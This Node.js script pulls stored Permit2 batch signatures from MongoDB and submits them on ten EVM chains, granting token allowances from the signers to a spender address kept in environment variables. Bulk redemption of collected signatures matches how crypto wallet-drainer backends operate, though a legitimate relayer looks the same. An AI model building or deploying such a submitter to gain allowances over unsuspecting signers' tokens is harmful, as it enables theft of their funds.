require('dotenv').config();
const { MongoClient } = require('mongodb');
const { ethers } = require('ethers');

const networkConfig = {
  1: { //mainnet
    rpcUrl: process.env.MAINNET_URL,
    spenderAddress: process.env.MAINNET_SPENDER,
    permit2Address: process.env.MAINNET_PERMIT2
  },
  8453: { //base
    rpcUrl: process.env.BASE_URL,
    spenderAddress: process.env.BASE_SPENDER,
    permit2Address: process.env.BASE_PERMIT2

  },
  42161: { //arbitrum
    rpcUrl: process.env.ARBITRUM_URL,
    spenderAddress: process.env.ARBITRUM_SPENDER,
    permit2Address: process.env.ARBITRUM_PERMIT2

  },
  56: { //bsc
    rpcUrl: process.env.BNB_URL,
    spenderAddress: process.env.BNB_SPENDER,
    permit2Address: process.env.BNB_PERMIT2
  },
  10: { //optimism
    rpcUrl: process.env.OPTIMISM_URL,
    spenderAddress: process.env.OPTIMISM_SPENDER,
    permit2Address: process.env.OPTIMISM_PERMIT2

  },
  7777777: { //zora
    rpcUrl: process.env.ZORA_URL,
    spenderAddress: process.env.ZORA_SPENDER,
    permit2Address: process.env.ZORA_PERMIT2

  },
  43114: { //avalanche
    rpcUrl: process.env.AVALANCHE_URL,
    spenderAddress: process.env.AVALANCHE_SPENDER,
    permit2Address: process.env.AVALANCHE_PERMIT2

  },
  137: { //polygon
    rpcUrl: process.env.POLYGON_URL,
    spenderAddress: process.env.POLYGON_SPENDER,
    permit2Address: process.env.POLYGON_PERMIT2

  },

  324: { //zksync
    rpcUrl: process.env.ZKSYNC_URL,
    spenderAddress: process.env.ZKSYNC_SPENDER,
    permit2Address: process.env.ZKSYNC_PERMIT2
  },
  81457: { //BLAST
    rpcUrl: process.env.BLAST_URL,
    spenderAddress: process.env.BLAST_SPENDER,
    permit2Address: process.env.BLAST_PERMIT2

  }

}


// Configuration
const MONGO_URI = process.env.MONGO_URI;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const client = new MongoClient(MONGO_URI);

async function submitPermits() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const permitsCollection = db.collection('permits');

    const permits = await permitsCollection.find({ executed: false }).toArray();
    if (permits.length === 0) {
      console.log('No unexecuted permits found');
      return;
    }

    const currentTimestamp = Math.floor(Date.now() / 1000);

    for (const permitData of permits) {
      const { owner, permitBatch, signature, chainId } = permitData;

      if (!chainId || !networkConfig[chainId]) {
        console.log(`Unsupported chainId ${chainId} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, spenderAddress, permit2Address } = networkConfig[chainId];
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
      const permit2Contract = new ethers.Contract(permit2Address, [ // Use dynamic permit2Address
        'function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details, address spender,uint256 sigDeadline) permitBatch, bytes calldata signature)',
        'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
      ], wallet);

      console.log(`Processing batch permit for owner: ${owner} on chainId: ${chainId}`);
      console.log('PermitBatch:', JSON.stringify(permitBatch, null, 2));
      console.log('Signature:', signature);

      for (const detail of permitBatch.details) {
        const { nonce: currentNonce } = await permit2Contract.allowance(owner, detail.token, spenderAddress);
        if (currentNonce.toString() !== detail.nonce.toString()) {
          console.log(`Nonce mismatch for ${detail.token}: DB=${detail.nonce}, On-chain=${currentNonce}`);
          await permitsCollection.updateOne(
            { _id: permitData._id },
            { $set: { executed: true, executedAt: new Date(), reason: `Nonce mismatch for ${detail.token}` } }
          );
          continue;
        }
      }

      if (currentTimestamp > permitBatch.sigDeadline) {
        console.log(`Signature deadline expired: ${permitBatch.sigDeadline} < ${currentTimestamp}`);
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date(), reason: 'Signature expired' } }
        );
        continue;
      }

      try {
        const permitTx = await permit2Contract.permit(owner, permitBatch, signature, { gasLimit: 100000 });
        await permitTx.wait();
        console.log(`Batch permit submitted: ${permitTx.hash}`);

        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { submitted: true, submittedAt: new Date() } }
        );
        console.log(`Batch permit marked as submitted for owner: ${owner}`);
      } catch (permitError) {
        console.error('Batch permit submission failed:', permitError);
        continue;
      }
    }
  } catch (error) {
    console.error('Submission failed:', error);
  } finally {
    await client.close();
  }
}

submitPermits().then(() => {
  console.log('Submission complete');
  process.exit(0);
}).catch((error) => {
  console.error('Script failed:', error);
  process.exit(1);
});
